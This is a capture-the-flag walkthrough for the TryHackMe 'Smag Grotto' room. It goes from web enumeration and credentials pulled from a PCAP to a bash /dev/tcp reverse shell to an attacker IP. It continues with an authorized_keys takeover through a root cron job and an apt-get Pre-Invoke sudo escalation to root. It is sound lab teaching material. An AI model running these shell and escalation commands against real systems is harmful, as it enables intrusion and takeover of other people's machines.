# Smag Grotto

Follow the yellow brick road.

Deploy the machine and get root privileges.

Room: https://tryhackme.com/room/smaggrotto

⚠️ STOP

Stuck and need a nudge in the right direction?

➡️ Try the hints page before reading the full solution: https://github.com/garthheff/CTF-Hints/blob/main/smaggrotto.md

---

## Initial Web Enumeration

The target web server was available over HTTP. A quick Gobuster scan against the root web directory revealed a small site and a `/mail/` directory.

```bash
root@ip-10-65-82-179:~# gobuster dir -u http://10.65.144.181/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html,js,bak,old
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.65.144.181/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,html,js,bak,old,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 402]
/index.php            (Status: 200) [Size: 402]
/mail                 (Status: 301) [Size: 313] [--> http://10.65.144.181/mail/]
Progress: 32298 / 32305 (99.98%)
===============================================================
Finished
===============================================================
```

The important result here is:

```text
/mail                 (Status: 301) [Size: 313] [--> http://10.65.144.181/mail/]
```
---

## Mail Directory and PCAP Discovery

Browsing to the mail directory showed a message about a network migration and provided a packet capture file.

```text
Network Migration

Due to the exponential growth of our platform, and thus the need for more systems, we need to migrate everything from our current 192.168.33.0/24 network to the 10.10.0.0/8 network.

The previous engineer had done some network traces so hopefully they will give you an idea of how our systems are addressed.
dHJhY2Uy.pcap
```

The filename looked Base64-like:

```text
dHJhY2Uy.pcap
```

Decoding the name gives `trace2.pcap`, which suggests the file is intended to be downloaded and inspected.

---

## Extracting Credentials from the PCAP

Inside the packet capture, an HTTP login request was visible. The request exposed a username and password in clear text.

```http
POST /login.php HTTP/1.1
Host: development.smag.thm
User-Agent: curl/7.47.0
Accept: */*
Content-Length: 39
Content-Type: application/x-www-form-urlencoded

username=helpdesk&password=[REDACTED_PASSWORD]
HTTP/1.1 200 OK
Date: Wed, 03 Jun 2020 18:04:07 GMT
Server: Apache/2.4.18 (Ubuntu)
Content-Length: 0
Content-Type: text/html; charset=UTF-8
```

This reveals two useful details:

- A virtual host: `development.smag.thm`
- Login credentials for the `helpdesk` user

At this point, the virtual host should be added to `/etc/hosts` so the hostname resolves to the target IP.

Example:

```bash
10.65.144.181 development.smag.thm
```

After that, the credentials from the PCAP can be used against the development login page.

---

## Getting a Reverse Shell

After authenticating to the development area, command execution was used to obtain a reverse shell.

The reverse shell payload used was:

```bash
bash -c 'bash -i >& /dev/tcp/192.168.205.203/4444 0>&1'
```

A listener should be running on the attacking machine before triggering the payload:

```bash
nc -lvnp 4444
```

Once the shell connects back, upgrade the TTY for easier interaction.

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

This gave shell access as the web server user.

---

## Local Enumeration as www-data

The shell landed in the development web directory.

A useful next step was to inspect cron jobs, because scheduled tasks often reveal automated root actions.

```bash
www-data@smag:/var/www/development.smag.thm$ cat /etc/crontab
cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*  *    * * *   root	/bin/cat /opt/.backups/jake_id_rsa.pub.backup > /home/jake/.ssh/authorized_keys
```

The final cron entry is the key finding:

```bash
*  *    * * *   root	/bin/cat /opt/.backups/jake_id_rsa.pub.backup > /home/jake/.ssh/authorized_keys
```

Every minute, root copies the contents of `/opt/.backups/jake_id_rsa.pub.backup` into Jake's SSH `authorized_keys` file.

This means if the backup file is writable by `www-data`, it can be replaced with our own public key. Then cron will install that public key for Jake, allowing SSH access as Jake.

---

## Checking if the Backup File is Writable

The backup key file was tested for write permissions.

```bash
www-data@smag:/var/www/development.smag.thm$ test -w /opt/.backups/jake_id_rsa.pub.backup && echo writable || echo not-writable
</opt/.backups/jake_id_rsa.pub.backup && echo writable || echo not-writable  
writable
```

The result confirmed that the file was writable.

This is the privilege escalation path from `www-data` to `jake`.

---

## Creating an SSH Key for Jake Access

On the attacking machine, a new SSH keypair was generated.

```bash
ssh-keygen -t rsa -b 4096 -f jake_key
```

The public key was then displayed.

```bash
cat jake_key.pub
ssh-rsa [REDACTED_PUBLIC_KEY] root@ip-10-67-69-117
```

The public key was copied into the writable backup file on the target.

```bash
echo 'ssh-rsa [REDACTED_PUBLIC_KEY]' > /opt/.backups/jake_id_rsa.pub.backup
```

After waiting about one minute, cron copied the new key into Jake's `authorized_keys` file.

Then the private key permissions were fixed locally and SSH was used to log in as Jake.

```bash
chmod 600 jake_key
ssh -i jake_key jake@10.65.144.181
```

The captured SSH session showed successful login as Jake.

```bash
root@ip-10-67-69-117:~# ssh -i jake_key jake@10.67.151.10
The authenticity of host '10.67.151.10 (10.67.151.10)' can't be established.
ECDSA key fingerprint is SHA256:MMv7NKmeLS/aEUSOLy0NbyGrLCEKErHJTp1cIvsxnpA.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.67.151.10' (ECDSA) to the list of known hosts.
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-142-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

Last login: Fri Jun  5 10:15:15 2020
jake@smag:~$ whoami
jake
jake@smag:~$ id
uid=1000(jake) gid=1000(jake) groups=1000(jake),4(adm),24(cdrom),30(dip),46(plugdev),114(lpadmin),115(sambashare),1001(netadmin)
```

---

## User Flag

The user flag was readable from Jake's home directory.

```bash
jake@smag:~$ cat user.txt 
[REDACTED_USER_FLAG]
```

---

## Privilege Escalation from Jake to Root

Checking sudo permissions showed that Jake could run `apt-get` as root without a password.

```bash
jake@smag:~$ sudo -l
Matching Defaults entries for jake on smag:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jake may run the following commands on smag:
    (ALL : ALL) NOPASSWD: /usr/bin/apt-get
```

This is dangerous because `apt-get` supports options that can execute commands before running an update operation.

Using `APT::Update::Pre-Invoke`, a root shell was spawned.

```bash
jake@smag:~$ sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
# whoami
root
# cd /root
# ls
root.txt
# cat root.txt	
[REDACTED_ROOT_FLAG]
```

This completed the path to root.

---

## Attack Path Summary

1. Enumerated the web server with Gobuster.
2. Found `/mail/`.
3. Discovered a PCAP file from the mail page.
4. Extracted HTTP login credentials from the PCAP.
5. Identified the development virtual host `development.smag.thm`.
6. Logged into the development site.
7. Used command execution to get a reverse shell as `www-data`.
8. Found a root cron job copying a backup public key into Jake's `authorized_keys`.
9. Confirmed the backup public key file was writable.
10. Replaced the backup public key with our own public key.
11. Waited for cron to copy it into Jake's authorized keys.
12. SSHed in as `jake`.
13. Found Jake could run `apt-get` as root without a password.
14. Used `apt-get` pre-invoke command execution to spawn a root shell.
15. Read the root flag.

---

## Key Lessons

- PCAP files can leak credentials if traffic is not encrypted.
- Virtual hosts should always be checked when hostnames appear in traffic or page content.
- Cron jobs running as root are high-value enumeration targets.
- Writable files used by root-controlled automation can become privilege escalation paths.
- SSH `authorized_keys` abuse is a clean way to move laterally or escalate to another user when a writable key source is copied into place.
- `sudo -l` should be checked immediately after gaining a real user shell.
- `apt-get` with unrestricted sudo access can be abused to execute commands as root.
